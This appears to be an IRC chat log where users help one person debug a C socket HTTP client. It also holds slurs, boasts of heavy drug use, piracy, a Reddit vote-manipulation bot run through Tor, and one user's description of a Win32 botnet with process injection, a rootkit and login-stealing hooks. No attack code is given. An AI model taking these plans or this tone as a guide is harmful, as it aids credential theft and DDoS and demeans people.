19:39       fenriz │  haha, dudeeeee
19:39       fenriz │  english breakfasts are bad enough as it is
19:39       fenriz │  now you guys have fish and chips as breakfast?
19:39       fenriz │  you guys have pork three different ways 
19:39        dami0 │  I don't
19:39        dami0 │  pork three different ways?
19:39       fenriz │  ham, sausage, bacon
19:40        dami0 │  well, sausage. polish people have many different types
19:41       fenriz │  ah i see
19:41      bottomy │  fenriz: butter chicken is great :)
19:41       fenriz │  bottomy: mein neger :)
19:41        dami0 │  then there's all the different cuts of pig that can be baked, cooked, boiled, smoked and fried
19:41       Rudolf │  das grafkanker
19:42       fenriz │  yeah there is a lot oyu can do with a pig and have it end up tasting great.
19:42       Rudolf │  are pigs native to asia
19:43        dami0 │  well, the kardashians are from asia, right?
19:44       Rudolf │  no
19:44       Rudolf │  they're dad is armenian
19:44      bottomy │  Rudolf: I'd think so (maybe more boars than pigs)
19:44       Rudolf │  their mom is some american whore
19:44       fenriz │  wild boars lol
19:44        dami0 │  so, half asian
19:44       fenriz │  there was a russian video where a guy used a sink to kill it
19:44       Rudolf │  armenia != asia dami0 
19:45       fenriz │  hahaha
19:45      bottomy │  lol a sick?
19:45      bottomy │  sink*
19:45       fenriz │  yeah, let me see if i can link you.

19:45         shix │  jjumbii: bored as fuck
19:45      bottomy │  was he waterboarding it to death? o.O
19:45       fenriz │  no man he hit it
19:45        dami0 │  armenia is the first state in the world to adopt christianity 
19:46        dami0 │  no wonder america bombed the fuck out of them
19:46       Rudolf │  wat
19:46       Rudolf │  america is backwards as hell
19:46        dami0 │  also, looking at the map, pretty sure it's in asia
19:46       Rudolf │  "in god we trust" on their notes
19:46       Rudolf │  dami0, eurasia is called eurasia for a reason
19:46       Rudolf │  its not asia
19:47        dami0 │  "Located at the crossroads of Western Asia and Eastern Europe"
19:47      bottomy │  llol
19:47       Rudolf │  dami0, aka not asia
19:47       Rudolf │  you retarded shi
19:47       Rudolf │  t
19:47        dami0 │  aka, yes, asia 
19:47      bottomy │  that vid is just so weird
19:47        dami0 │  you even more retarded shit
19:47        dami0 │  london is in on top of four different counties
19:47        dami0 │  therefore, it lays on each one of them
19:47       Rudolf │  dami0, did you get some kind of ghetto education from one of those shit tier countries?
19:48        dami0 │  same as turkey is on two different continents
19:48       Rudolf │  poland, czech, bosnia etc
19:48      jjumbii │  shix: i'm just fucking around with random programming languages now
19:48        dami0 │  heh, we have better education than your exam riddent filth pit
19:48      jjumbii │  like ChucK
19:48       Rudolf │  dami0, stats says otherwise
19:48       fenriz │  is anyone here with good with C socket programming?
19:48       Rudolf │  yes fenriz 
19:48       fenriz │  client side of things, like HTTP get requests?
19:48       fenriz │  :0
19:49        dami0 │  Rudolf: last time I looked it worked in our favour
19:49       Rudolf │  yes fenriz 
19:49       fenriz │  i have a question:
19:49       Rudolf │  ok
19:49       fenriz │  i get the HTTP request back.  i get the 200 OK.
19:49       fenriz │  and content length, i even managed to close the connection: close  for the webpage
19:50         shix │  jjumbii: im just working out, and it got boring quickly
19:50       Rudolf │  so whats the issue fenriz 
19:50       fenriz │  however, when i pass it an URL to an image, say a .png, and it returns bytes/binary right?   i redirect it to say,   ./client www.image.png   > image.png
19:50       fenriz │  i get like 51 byte sized image which won't open.   the  original one is like 5k.
19:50         quit │  gurhush
19:50       Rudolf │  dont include the www
19:50       Rudolf │  fenriz, 
19:50       fenriz │  i am missing bytes/binary data somewhere.
19:51       fenriz │  hmm, dont include the www? 
19:51       Rudolf │  Host: site.com\r\n
19:51       fenriz │  yup, check
19:51       Rudolf │  ok
19:51       fenriz │  and i even ended it with \r\n\r\n
19:51       Rudolf │  and your sending a GET request right...?
19:51       fenriz │  it works with html/text pages.
19:51       fenriz │  absolutely.
19:51       fenriz │  over AF_INET, SOCK_STREAM.
19:52       fenriz │  i have a feeling that, maybe i'm using printf, which doesn't handle byte/binary data/
19:52       Rudolf │  it doesnt
19:52       fenriz │  i see.
19:52       Rudolf │  dont printf with %s specifieer
19:52       Rudolf │  on data that isnt zero terminated
19:52       Rudolf │  it will fuck up
19:52         shix │  jjumbii: http://imgur.com/a/hHfGZ#6 is this you
19:52       fenriz │  well, what i did was, i declared a buffer, and then did (printf(%c), byttearray[i])
19:53      jjumbii │  lel
19:53        dami0 │  are you using libcurl?
19:53       Rudolf │  yeah please dont be using libcurl
19:53       fenriz │  nope
19:53       Rudolf │  its shit
19:53       Rudolf │  fenriz, what was the 51 byte buffer anyway?
19:53       Rudolf │  totally random shit data?
19:53        dami0 │  you think everything is shit
19:53       Rudolf │  or something of meaning
19:53       Rudolf │  you might need to specifify the accept-types in the request header
19:53       fenriz │  i can't tell what the 51byte contains, as i can't even open it myself.
19:53       fenriz │  i am guessing it is shit data.
19:54        dami0 │  see, if you used libcurl you wouldn't have these problems
19:54       Rudolf │  but if you use libcurl then you wont understand whats happening
19:54       Rudolf │  anyway for most tasks libcurl is total blote
19:54       Rudolf │  and retarded to use
19:54       Rudolf │  sending a get/post in C
19:54       Rudolf │  is like 50 lines of code
19:54       fenriz │  yes,
19:54        dami0 │  you can just look at the source
19:54       fenriz │  in python it's like 10.
19:54       fenriz │  haha
19:54       Rudolf │  in vb.net
19:55       Rudolf │  its 1
19:55       fenriz │  i feel that my step that fucks me up is the receive stage.
19:55       fenriz │  i can't tell whether or not i'm receiving all the bytes.
19:55       Rudolf │  paste your code
19:55       fenriz │  or the fact that, i AM receiving all the bytes but i can't read it.
19:55       fenriz │  alright, gimme a sec.
19:55        dami0 │  bytes, all of them
19:55        dami0 │  give them to me
19:55       fenriz │  i ought to clean it up a bit
19:57       fenriz │  http://ix.io/9XN
19:57       fenriz │  here you go
19:57       fenriz │  perhaps take a look at step 4?
19:57       fenriz │  but i could be wrong anywhere else.
19:57       fenriz │  i'm not confident with my C at all.
19:58       Rudolf │  just skimming through it
19:58       Rudolf │  heads up
19:58       Rudolf │  snprintf returns the number of bytes written
19:58       Rudolf │  saves the need for a separate time consuming strlen call
19:59       fenriz │  snprintf?  
19:59       Rudolf │  yes
19:59       fenriz │  so it juts returns on int, with which i can use to form a byte array?
19:59       Rudolf │  Upon successful return, these functions return the number of characters printed (excluding the null byte used to end output to strings).
19:59       Rudolf │  len = snprintf(...)
19:59        venam │  topkek lol
19:59       Rudolf │  write(socket, buf, len);
20:00       fenriz │  venam: STOP LAUGHING AT MY CODE.
20:00       fenriz │  venam: lol
20:00        venam │  that guy on /b/, 42 prints all the images in the thread and mail them to his neighboor
20:00       fenriz │  ahh i see.
20:00       fenriz │  Rudolf: is there a glaring, retarded error with my printf statement?
20:00       fenriz │  or should i jut avoid that altogether?
20:00        dami0 │  for this task, you probably should
20:00       Rudolf │  fenriz, well just on a skim through it
20:00       Rudolf │  read and write
20:00       Rudolf │  return 0
20:00       Rudolf │  if the connection was closed
20:01       Rudolf │  -1 on error
20:01        dami0 │  and >9000 is penis
20:01        dami0 │  if*
20:01       Rudolf │  ^
20:02       fenriz │  alright,  i will make sure to have a case that handles "penis"
20:02        dami0 │  kek
20:03       fenriz │  another question is:   you see how i made a char b[4095]?  which was completely arbitrary, that number?
20:03       Rudolf │  imo
20:03       Rudolf │  do like
20:03       Rudolf │  char buf[512];
20:03       fenriz │  why smaller ;9
20:04       fenriz │  ;(
20:04       Rudolf │  and just keep calling read(socket, buf, sizeof(buf));
20:04        dami0 │  basically 2^x power series
20:04       Rudolf │  until it returns <= 0
20:04         quit │  earsplit
20:04       Rudolf │  fenriz, putting gigantic variables on the stack is generally a bad idea
20:04       Rudolf │  4096 bytes is gigantic
20:05       fenriz │  If i understand you correctly, to sum it up:
20:06       fenriz │  Declare char buf[512].   Socket's reply will be "dumped" into the buf.  
20:06       fenriz │  I read the buf, and socket will write to buf again, and i read until no more bytes?
20:07       Rudolf │  yes
20:07       Rudolf │  just good practice, because what if the resource is larger than the specified buffer
20:07       Rudolf │  you will require multiple reads
20:07       Rudolf │  also its generally better practice to use
20:07       Rudolf │  send/recv
20:07       fenriz │  yes, that is another question i had.
20:07       Rudolf │  when working with sockets
20:07       Rudolf │  rather than read/write
20:08       fenriz │  ah yes, okay, i will try it with recv.
20:08       fenriz │  As for the printf though...
20:08       fenriz │  i am frantically looking at something that handles binary data.
20:08       Rudolf │  well you could always just zero terminate your array
20:08       Rudolf │  and print that
20:08       Rudolf │  len = recv(sock, buf, sizeof(buf) - 1, 0);
20:08       Rudolf │  buf[len] = '\0';
20:08       Rudolf │  printf("%s", buf);
20:09       Rudolf │  http://i.imgur.com/joNlJM6.gif
20:09       Rudolf │  eww
20:09         quit │  Loki123
20:09       fenriz │  i once had those
20:09       fenriz │  but it was a brown sharpie
20:09       fenriz │  i didnt' have to feed it.
20:10       Rudolf │  wut
20:10       fenriz │  that kid reminds me of a marker.
20:11       Rudolf │  lel
20:12        dami0 │  lel
20:12        dami0 │  the first actual skid mark
20:13       fenriz │  Rudolf: isn't read for things that contain FILENAMES?
20:13       fenriz │  and it requires i pass it a filedescriptor?
20:13       fenriz │  Where can I put the socket thougH?
20:13       Rudolf │  you can use read() on any type of descriptor
20:14       Rudolf │  but recv() is specifcly designed for sockets
20:14       fenriz │  so then even sockets is fair game?
20:14       Rudolf │  + makes your code more portable
20:14       Rudolf │  windows doesnt have a read(), but its winsock implementation has a recv()
20:14       Rudolf │  etc
20:14       Rudolf │  just better practice
20:14       Rudolf │  if you look in sys\socket.h anyway
20:15       fenriz │  aaah i see
20:15       fenriz │  alrighty
20:15       fenriz │  lemme give this a shot
20:16         vypr │  Winamp is back.
20:17       Rudolf │  why wont it die
20:17         vypr │  It can still whip the llama's ass.
20:18         quit │  libbro
20:19         yrmt │  aww yiss
20:19         yrmt │  it was awesome
20:20       Rudolf │  winamp user interface was a cluttered mess
20:23        venam │  milkdrop
20:23       fenriz │  hey Rudolf, so what I did was just made a lost list of printf and reads statement juts to see for myself when it hits 0
20:23       fenriz │  http://ix.io/9XO
20:23       fenriz │  at the very bottom, juts to give you an idea.
20:23       fenriz │  So i'm like, great, i see the output as '512 512 512 512 512 146 0'
20:24       Rudolf │  thats good
20:24       Rudolf │  but you should really put it in a loop 
20:24       Rudolf │  rather than a massive list
20:24       fenriz │  oh yes, of course
20:24       fenriz │  tha twas for debugging and a visual
20:24       Rudolf │  oh ok
20:24       fenriz │  and i'm lazy, so i went to down on 2yy + p on vim
20:24       fenriz │  went to town*
20:24         quit │  shix
20:24       Rudolf │  anyway based on the output its pretty clear
20:25       fenriz │  but my next question here is that, since i have the total size, which isn't something i want though.
20:25       Rudolf │  ok
20:25       fenriz │  because what i am concerned with is waht's tored in the buffer, b
20:25       fenriz │  so for each iteration, would i have to while loop and READ the buffer again, read it until the buffer size 512, an stop?
20:26         quit │  kirby
20:26       Rudolf │  for (;;)
20:26       Rudolf │  	{
20:26       Rudolf │  		len = recv(s, buf, sizeof(buf) - 1, 0);
20:26       Rudolf │  		if (len <= 0)
20:26       Rudolf │  			break;
20:27       Rudolf │  		buf[len] = '\0';
20:27       Rudolf │  		printf("%s\n", buf);
20:27       Rudolf │  	}
20:27       fenriz │  hang tight, what is for (;;)
20:27       Rudolf │  endless loop
20:27       fenriz │  i tried googling that and it returned ntohing of interest.
20:27       Rudolf │  people sometimes do while (1)
20:27       Rudolf │  since 1 = 1 always
20:27       Rudolf │  for (;;) is just some method that the bsd style(9) seems to suggest
20:28       Rudolf │  as well as other coding standards
20:28       fenriz │  ah okay..
20:28       fenriz │  well it is berkeley sockets :P
20:28       Rudolf │  yes
20:28       fenriz │  hang tight, how come all of a sudden here you are recv?
20:28      jjumbii │  shit
20:28      jjumbii │  getting some carpal tunnel 
20:29       Rudolf │  fenriz, the last arg of recv is flags
20:29       Rudolf │  if flags = 0
20:29       Rudolf │  as in my code, its equivalent to read
20:29       Rudolf │  its because the bsd sockets implementation specifies
20:29       Rudolf │  send/recv
20:29         yrmt │  tfw got login access at edgebsd
20:29         yrmt │  :D:D:D
20:29       fenriz │  so setting flags to 0 makes it read.  i se.
20:29       fenriz │  C is weird like that.
20:29       Rudolf │  well equivalent too
20:29       Rudolf │  but its seriously better to use send/recv
20:29        dami0 │  does edgebsd have a logo?
20:29       Rudolf │  when working with sockets
20:29       Rudolf │  instead of read/write
20:30       Rudolf │  just for portability reasons alone
20:30         dcat │  hold on
20:30         dcat │  is Rudolf bosko?
20:30        dami0 │  yh
20:30         dcat │  bosko!
20:30       fenriz │  we ruled out that he isn't 'rude'
20:31       fenriz │  otherwise he would have flamed me then laugh at my code
20:31        dami0 │  his name is Rudolf Hess
20:31         dcat │  who is rude?
20:31        dami0 │  bosko
20:31        dami0 │  except then he's a rudeboy
20:31        dami0 │  apparently now he's a code nazi
20:32        dami0 │  hue
20:32         dcat │  a message to you rudy
20:32       Rudolf │  hue dami0 
20:32         yrmt │  I'm an EdgeBSD developper
20:32        dami0 │  yrmt: good job.
20:33        dami0 │  next step: rice toasters
20:33       Rudolf │  what the hell is the point of the edgebsd project anyway
20:33        dami0 │  I'm considering driving to brussels for fosdem
20:33       Rudolf │  why not focus on netbsd, not create another damned fork
20:34         dcat │  cause toasters
20:34         yrmt │  dami0: that'd be awesome
20:35        dami0 │  they want more aggressive up-to-dateness
20:35        dami0 │  apparently
20:35         vypr │  Anyone wanna play some CS:GO?
20:35         yrmt │  Rudolf: because edgy toaster
20:35       Rudolf │  dami0, my tv is mips
20:35       Rudolf │  if only i had a backup
20:35        dami0 │  edgy toaster making rice
20:35       Rudolf │  i would install netbsd
20:35       Rudolf │  and rice my tv
20:35        dami0 │  why don't you put edge on it
20:35       Rudolf │  because
20:35       Rudolf │  i have no backup of my tv's real os
20:35        dami0 │  also, what the hell do you need backing up?
20:35        dami0 │  oh
20:35       Rudolf │  and pretty sure it would be a nightmare to find again
20:35       Rudolf │  because its the user interface for my tv
20:36       Rudolf │  how i receive BSkyB signals illegaly etc
20:36        dami0 │  back it up?
20:36        dami0 │  >Sky
20:36       Rudolf │  implying there is a better sattelite provider
20:36        dami0 │  >not getting everything in 4k from da nets
20:36       Rudolf │  i prefer having normal tv
20:36       Rudolf │  so i can interact with normies
20:36       Rudolf │  about the shows
20:37        dami0 │  the normal people I hang out with watch stuff online
20:37       Rudolf │  http://i.imgur.com/JnwgzdV.gif
20:37        dami0 │  but then again, one's isn't normal, the other is russian, the next is a midnight toker...
20:37       Rudolf │  yeah but sometimes dami0 i just like to get really high
20:37       Rudolf │  and flick through channels
20:37       Rudolf │  until i find some funny shit
20:37       Rudolf │  none of the googling/links bullshit
20:37        dami0 │  wat?
20:38        dami0 │  I just magnet from tpb
20:38        dami0 │  1.5GiB takes about 10 mins
20:38       Rudolf │  tv shows?
20:38       Rudolf │  i use tpb too
20:38        dami0 │  so a normal tv quality show is like, 102 minutes
20:38        dami0 │  1-2*
20:40         yrmt │  dami0: git.unixhub.net as mirror for edgebsd
20:40         yrmt │  but it's down:(
20:40         yrmt │  pls get it back up
20:40        dami0 │  yeah, rebranding
20:40        dami0 │  I'm not the one
20:40        dami0 │  who does the git
20:40         dcat │  git it up again
20:42         vypr │  yrmt: You wanna do it?
20:42         yrmt │  do what
20:42         yrmt │  I just need it to be up
20:42         vypr │  Rebranding;fixing shit.
20:42         yrmt │  and it needs to work well
20:42         yrmt │  because pkgsrc work needs to be done!
20:42         yrmt │  vypr: no need for rebranding
20:42         yrmt │  just get that shit up
20:43         yrmt │  vypr: where is it hosted
20:43         yrmt │  ?
20:43         yrmt │  can't be the USA

20:44         vypr │  Its up, but you're gonna need to make a new account.
20:44         vypr │  It got lost during the upgrade.
20:44         yrmt │  edgebsd uses cgit which looks oldish
20:44         vypr │  I can give you backups of repos before the upgrade, also.

21:18       Rudolf │  but yes fenriz 
21:18       Rudolf │  sup
21:19       fenriz │  right now, inside the for(;;) if i use printf, i seem to get all the hmtl/text.  but using write, my output gets truncated prematurely.
21:20       fenriz │  thing is though, i need to get write() to work since it works nic with binary data.
21:20       fenriz │  to giv eoy ua visual:
21:20       fenriz │  http://ix.io/9XS
21:20       fenriz │  if i keep the printf, but uncomment the write and flush, i get all the output.
21:21       Rudolf │  do sizeof(b) - 1
21:21       Rudolf │  in the read call
21:21       fenriz │  if i keep the write and flush but comment the printf, i am missing stuffl
21:21       fenriz │  i just gave that a shot
21:21       jjumbii│  jmbi-afk
21:21       fenriz │  and with the printf commented out, and uncommenting the write/flush, i am still getting a truncated message.
21:21       fenriz │  :/
21:22       Rudolf │  b[len] = '\0';
21:22       Rudolf │  printf("%\n", b);
21:22       Rudolf │  "%s\n" *
21:22       Rudolf │  just delete the write/flush
21:22        venam │  you normally don't need flush if you are printing \n
21:23       fenriz │  aah i see.
21:23       fenriz │  well, that worked well with the html/text
21:23       fenriz │  if i bring back the b[len]
21:23       fenriz │  i am going to try binary data images.
21:23       fenriz │  grr...
21:23       fenriz │  now it is always the image.png that trips up.
21:23       Rudolf │  might as well replace the printf("%s\n", b);
21:24       Rudolf │  with a (f)write call
21:24       Rudolf │  to some a file you created
21:24         join │  libbro
21:24       Rudolf │  so you can actually open it up with an image viewer
21:24       fenriz │  i'm afraid i can't do that.
21:24       fenriz │  it has to be run like ./httpclient urltoimage.png > image.png
21:24       fenriz │  fucking dicks. they are.
21:24       Rudolf │  so write to image.png write?
21:24       Rudolf │  right*
21:25       fenriz │  yes, i will need to write to image.png
21:25       fenriz │  using linux redir
21:25       fenriz │  can't have that in the code though.
21:25       Rudolf │  oh
21:26       Rudolf │  umm
21:26       Rudolf │  well tried
21:27       Rudolf │  printf("%s", b);
21:27       Rudolf │  with no \n?
21:27       Rudolf │  should just print the binary data as a string
21:27       Rudolf │  but that isnt what you want
21:27       Rudolf │  seriously, just put some code in
21:27       Rudolf │  to write the received bytes
21:27       Rudolf │  into image.php or w/e
21:28       fenriz │  yes i have tried without the \n
21:28       Rudolf │  ./httpclient host.com/image.png /tmp/image.png
21:28       Rudolf │  would be the logical method
21:28       fenriz │  yeah that is what i thought too, that it should print the binary data as a string.   i saw it.  cuz it looked funy and stuff on the terminal.
21:28       Rudolf │  shell >/>> operators
21:28       Rudolf │  only handle strings
21:28       Rudolf │  iirc
21:28       Rudolf │  not binary data
21:28       fenriz │  oh fuck this could be game changer then.
21:29       fenriz │  well, i had a java version which wrote to image no problem-o
21:29       fenriz │  i just ran that one.
21:29       Rudolf │  is the java code
21:29       Rudolf │  writing to stdio?
21:29       Rudolf │  stdout*
21:30  NeoTerra|AFK│  NeoTerra
21:30       fenriz │  yes i tis
21:30       Rudolf │  as a string?
21:31       fenriz │  not as a string, no
21:31       fenriz │  as bytes.
21:32       Rudolf │  so do that
21:32       Rudolf │  write(stdout, b, len);
21:34       fenriz │  will do.
21:34       fenriz │  i wil need to kee pthe b[len] = '\0' right?
21:35         yrmt │  tfw comitted to edgebsd-pkgsrc
21:36       Rudolf │  nah you can comment that out fenriz 
21:36       Rudolf │  well keep it in
21:36       Rudolf │  wont make any different
21:36       Rudolf │  since the '\0' part wont get written
21:36       Rudolf │  '
21:36       Rudolf │  '
21:36       Rudolf │  '\0' is the character at the end of c strings
21:37       Rudolf │  so functions can figure out where the end is
21:37       fenriz │  ah i see
21:37       fenriz │  oh holy fuck.
21:37       fenriz │  IT WORKS
21:37       fenriz │  fuck yeah
21:38       fenriz │  :D
21:38       Rudolf │  send your minimum $20 donation
21:38       fenriz │  thank's a million, Rudolf 
21:38       Rudolf │  to bosko@boskocorp.biz
21:38       Rudolf │  just kidding
21:38       fenriz │  only if you are a nigerian prince.
21:38       fenriz │  no prince-hood, no donation.
21:38       fenriz │  :P
21:38       fenriz │  woohoo
21:39       fenriz │  i am ecstastic.
21:39       fenriz │  i owe you big time Rudolf :P
21:40       Rudolf │  nah, i'm just sitting here stoned
21:41       Rudolf │  randomly flicking between windows
21:41       Rudolf │  i help when i can
21:41         quit │  venam
21:41       Rudolf │  https://soundcloud.com/dj-white-lotus/clipse-wamp-wamp-white-lotus
21:42       fenriz │  you can code or at least, read code when you're high?
21:42       fenriz │  i go full retard and i can't do anything of value/productive.
21:43       fenriz │  i sit on the sofa, utterly useless and lazy lol
21:43       Rudolf │  if anything i'm better at programming when high
21:43       Rudolf │  was googling why
21:43       Rudolf │  and apparently marijuana somehoe lessens some elements of adhd
21:44         shix │  marijuana: the cure for everything
21:44       fenriz │  well it does lessens some elements of ahdh, perhaps a little too much
21:44       fenriz │  as i sit and concentrate on one word for two hours lol
21:45       Rudolf │  for me
21:45       Rudolf │  if i dont actively push myself to do things when high
21:45       Rudolf │  i easily sit for 5-6 hours in my living room
21:45       Rudolf │  watching random shit
21:45       Rudolf │  until 4-5am
21:46     NeoTerra │  why get high at all then?
21:46       Rudolf │  because it makes me feel good
21:46       Rudolf │  i just cant explain why
21:47       Rudolf │  also i'm psychologically addicted in some ways at least
21:48         shix │  i cant get anything done when high
21:48     NeoTerra │  nor can I
21:48     NeoTerra │  which is why I don't do it
21:48     NeoTerra │  also I think that basing happiness on a physical substance is a dangerous road to go down
21:49         dcat │  in short, don't get a gf
21:50     NeoTerra │  more like, get the RIGHT gf
21:50         dcat │  preferably a super religious one
21:50       fenriz │  if you think about it
21:50       fenriz │  our brain is nothing but a big bag of chemical reaction
21:50       fenriz │  when we get happy naturally, it is just realeasing chemicals.
21:50         dcat │  also, NeoTerra, what is other substances are there out there?
21:51         dcat │  tell me of these non-physical substances
21:51     NeoTerra │  I mean that you shouldn't be happy only when you're high on <insert drug here>
21:51       fenriz │  ah okay
21:52     NeoTerra │  also drugs screw up your happiness long term, because it warps what should be good an isn't, and then you feel less happy when you normally would have
21:52        tbuck │  meh, im feeling pretty ok right now havent had my morning bowl
21:53         dcat │  NeoTerra: have you ever done drugs?
21:53     NeoTerra │  yes
21:53        tbuck │  just cuz you get high doesnt mean youre replacng youre happiness
21:53         dcat │  which?
21:53     NeoTerra │  weed, painkillers, some E, also tried a wee bit of coke but hated it
21:54       Rudolf │  NeoTerra, guessing E pills?
21:54       Rudolf │  never do them
21:54       Rudolf │  they are never real mdma
21:54        tbuck │  some people look to fill their voids with drugs no doubt, but thats a much deeper problem
21:54       Rudolf │  tbuck, very likely
21:54       Rudolf │  i have done so many drugs, the fact that i only smoke weed every other day
21:54       Rudolf │  is a step up
21:54       Rudolf │  from spending weeks on psychedelics
21:54       Rudolf │  every single day
21:54       Rudolf │  waking up with an lsd tab
21:54       Rudolf │  or a mouthfull of mushrooms

21:55       Rudolf │  if anything mdma
21:55       fenriz │  i have a strange curiousity with psychedlics, but fear that i will have a bad trip for hte nex t8 hours because of my mind set.
21:55       Rudolf │  was pretty crazy
21:56       Rudolf │  i swallowed 600mg of 80% purity mdma

21:56       Rudolf │  god*
21:56       fenriz │  lol
21:56       Rudolf │  lay on my grass for 8-12 hours
21:56       Rudolf │  staring into the clouds
21:56       fenriz │  that must've been really pleasant.
21:56       Rudolf │  it came to the point 
21:56       Rudolf │  it was fenriz 
21:56       Rudolf │  my mom was like "come inside its 11pm"

21:57       Rudolf │  yeah
21:57       fenriz │  can't imagine doing that any other time of th eyear
21:57       Rudolf │  but a uk summer
21:57       Rudolf │  so it gets dark 8-9
21:57       Rudolf │  and cold as fuck soon after
21:57     NeoTerra │  meh I just generally find drugs unappealing and a waste of time, then again I think that they should be legal and if you want to fry your brain doing them, by all means go ahead :P
21:57       fenriz │  ah i see.
21:57       Rudolf │  NeoTerra, i find shit like alchohol and cigs
21:57       Rudolf │  a total waste of time
21:57       Rudolf │  but the majority of illegal drugs
21:58       Rudolf │  really are worth while
21:58       Rudolf │  at least to do a couple times in your life
21:58       fenriz │  i agre with Rudolf on the part where alcohol and cigs being a waste of time
21:58       fenriz │  it's really mundane compared to what's out there.
21:58       Rudolf │  yeah
21:58       Rudolf │  the drugs that kill the most people in the world ever year
21:58       Rudolf │  are the only legal and accepted ones
21:58       Rudolf │  its perfectly acceptable to get blackout drunk with your friends
21:58       Rudolf │  but smoke a joint 2-3 times a week?
21:59       Rudolf │  everyone looks at you funny
21:59       fenriz │  haha
21:59       fenriz │  the world isn't "ready" yet.
21:59        tbuck │  lol not here. shits been on the front page of the newspaper like every week
21:59       fenriz │  the fact that it is being legalised?
21:59        tbuck │  people are coming around
22:00     NeoTerra │  yeah they are
22:00     NeoTerra │  slowly
22:01       fenriz │  that's good news then
22:01       fenriz │  however, i feel that is still always going to be a stigma attached.
22:01       fenriz │  partly because of how stoners carry themselves.
22:01        tbuck │  fuck it
22:01        tbuck │  shouldnt matter what people think of you
22:01     NeoTerra │  ^
22:01       fenriz │  in a perfect world.
22:02        dami0 │  in a perfect world we wouldn't need to smoke
22:02        dami0 │  we'd be high already
22:02        tbuck │  lol
22:02        dami0 │  all day erryday
22:02        tbuck │  but then we'd need to smoke soemthing to make us sober, give us a lil break

22:03       fenriz │  at a party
22:03     NeoTerra │  thing is, no one would get anything done if people were high 24/7
22:03       fenriz │  #SOBER

22:03       fenriz │  NeoTerra: can you think of what the traffic would look like.
22:04     NeoTerra │  imagine all the people who'd get fired because they'd be sitting around doing nothing at work
22:04     NeoTerra │  lol
22:04        tbuck │  lol NeoTerra youd be surprised at how quickly a tolerance builds up. i only wish i could get as high as that
22:04       Rudolf │  people should stop judging the stoner majority based on a few edgy teens
22:04       Rudolf │  who think that they are weed smoking badasses
22:04     NeoTerra │  yeah you can build up a tolerance to just about anything

22:11        tbuck │  "adds a couple years to your life" hes says while lighting a cigarette
22:11     NeoTerra │  problem is, that if you do it when you're young, it screws up your short term memory after awhile

22:14       Rudolf │  alzheimers is no joke
22:15       Rudolf │  anyway interesting fact
22:15       Rudolf │  when soldiers are forced to stay awake for lond periods of time
22:15       Rudolf │  they notice that after you reach the 22-26 hour stage of being
22:15       Rudolf │  awake the feeling of tiredness
22:15       Rudolf │  goes away
22:15     NeoTerra │  yeah it does
22:15     NeoTerra │  comes back though at around 36-40 hours
22:16         dcat │  yeah, and you become susceptible to programming
22:16       Rudolf │  yeah
22:16     NeoTerra │  and then every subsequent time you feel tired after being awake longer gets rougher and rougher
22:16       Rudolf │  i went to bed last like at 23:00
22:16       Rudolf │  after 38 hours of being awake
22:17       Rudolf │  then woke up at 5am
22:17       Rudolf │  then spend 5-7 hours sitting half awake in bed
22:17       Rudolf │  now its 21:17, and im planning to go to bed in the next 3 hours
22:17       Rudolf │  i have a feeling this wont go to plan
22:18         dcat │  bosko, I don't know if I asked before, but are you a 7chantard?

22:55     NeoTerra │  BigE nah, gonna give people the week
22:55     NeoTerra │  Rudolf yeah windows SSL documentation is pretty crappy
22:55       Rudolf │  NeoTerra, this whole serv going ssl only?

03:24         bdas │  spread?
03:25         dcat │  oh
03:25         dcat │  does it just set up new reddit accounts?
03:25         dcat │  or does it use someone elses account?
03:25         bdas │  nah, i do that manually
03:25         bdas │  lol
03:25         dcat │  ah
03:25         bdas │  i made a python script to do it
03:25         BigE │  he made all the accounts manually
03:25       Rudolf │  you better be talking about the downvote bot
03:25         bdas │  since i have to do the captchas 
03:26       Rudolf │  i'm all for writing a bot in C
03:26       Rudolf │  since the api is w/e u call it
03:26       Rudolf │  ez enough
03:26         bdas │  Rudolf: the reddit api was in python, so, i just used python lel
03:26         bdas │  wu wei nigga
03:26       Rudolf │  it uses json tho
03:27         bdas │  it works
03:27         bdas │  and i used like 15 lines
03:28       Rudolf │  lel
03:28         dcat │  >works
03:28         bdas │  but because of reddit's fuzzing algorithim, i have to slowly do things
03:28         dcat │  everything it's supposed to.
03:28       Rudolf │  can i downvote things into oblivion yet
03:29         bdas │  if i upvote 20 times in under 30 minutes on /r/unixporn then it will add like 15 "fake" downvotes to even it out
03:29         BigE │  Rudolf: 30 bots is more than enough to downvote something into oblivion if you get too it early
03:29         BigE │  dat log scale
03:29         bdas │  yup
03:29         bdas │  that's why i got them on new

03:30         dcat │  bdas: do you change the ip for each post?
03:30         bdas │  nah
03:30         bdas │  i'm sure the people at reddit that have the ability to check my ip have better things to do
03:30       Rudolf │  use tor or something
03:30       Rudolf │  its ez
03:30         bdas │  it's not like mods can see anything
03:30       Rudolf │  just treat 127.0.0.1:9050
03:30       Rudolf │  as a socks5 proxy
03:30       Rudolf │  psure python can do this shit
03:30       Rudolf │  it like 1-15 lines
03:31         BigE │  yeah, use Tor and txtorcon to randomize your IP
03:31       Rudolf │  10-15*
03:31         dcat │  it would be pretty cool to setup a botnet
03:31         BigE │  actually
03:32         BigE │  something like tortunnel would probably be faster
03:32       Rudolf │  i'm writing an irc butnet atm dcat 
03:32         BigE │  and not put as much load on the tor network
03:32         bdas │  right now it's just a process of making the accounts 
03:32         dcat │  then make every infected host to donate like 0.2 bucks to amnesty international or something
03:32       Rudolf │  lel
03:32         dcat │  Rudolf: for what purpose?
03:32         dcat │  and on which platform
03:32       Rudolf │  dcat, ddos/holding bots/info grabbing
03:32       Rudolf │  win32
03:32       Rudolf │  injects svchost.exe to bypass hips
03:32       Rudolf │  then injects every userland process
03:32       Rudolf │  and deploys its rootkit
03:33       Rudolf │  to hide file/startup/plugins dir etc
03:33       Rudolf │  and a few ntdeviceiocontrolfile hooks
03:33       Rudolf │  to catch ftp/pop3 logins
03:33       Rudolf │  considering a browser hook
03:33       Rudolf │  to catch posts requests
03:33       Rudolf │  but fuck trying to pipe that shit onto an irc channel
03:33       Rudolf │  logs r gonna spam, or get lost
03:34         dcat │  I was thinking about making something similar
03:34         dcat │  well, for different purposes obviously
03:34       Rudolf │  worth it for the raw hf cash
03:34       Rudolf │  potencial

14:10   Neuromatic │  yrmt: THen I had the idea to using arch linux for creating a distro in a vm. Not enough disk space. That is … 
14:11         yrmt │  creating a distro?
14:11         yrmt │  just get a linux kernel, coreutils, gcc with binutils
14:12   Neuromatic │  That is what a lfs does. 
14:12         yrmt │  "does"
14:13   Neuromatic │  Yea, literally it tells you how to do it yourself, but if you want a clean beginning its the best way

14:26   Neuromatic │  Why peaple thinks grey transparent terms looks good with colors?
